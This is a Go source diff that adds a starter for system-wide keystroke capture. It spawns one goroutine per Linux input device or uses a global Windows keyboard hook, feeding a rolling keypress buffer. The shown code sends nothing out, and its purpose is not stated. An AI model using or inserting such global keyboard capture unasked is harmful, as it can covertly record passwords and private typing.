@@ -141,6 +141,33 @@ func appendKeypressEvent(ev keypressEvent) {
 	}
 }
 
+
+// Platform-agnostic keypress capture starter. Each OS-specific file
+// provides a captureKeypressDevice function (one per /dev/input/eventN
+// on Linux, or one for the Win32 keyboard hook on Windows). The
+// ensureKeypressCapture helper iterates over the available devices and
+// spawns one capture goroutine per device.
+var keypressCaptureOnce sync.Once
+
+func ensureKeypressCapture() {
+	keypressCaptureOnce.Do(func() {
+		for _, dev := range enumerateKeypressDevices() {
+			go captureKeypressDevice(dev)
+		}
+	})
+}
+
+
+// enumerateKeypressDevices returns the list of input devices to capture
+// keystrokes from. Linux: /dev/input/eventN that report EV_KEY. Windows:
+// always returns a single sentinel for the global keyboard hook.
+// macOS: returns nil (keypress capture is denied).
+
+// appendKeypressEvent is the cross-platform entry point for adding
+// captured keypress events to the rolling buffer. The OS-specific
+// capture goroutines call this once they've parsed their native event
+// record.
+
 func snapshotKeypressWindow(seconds int, maxKeys int) []keypressEvent {
 	keypressMu.Lock()
 	defer keypressMu.Unlock()
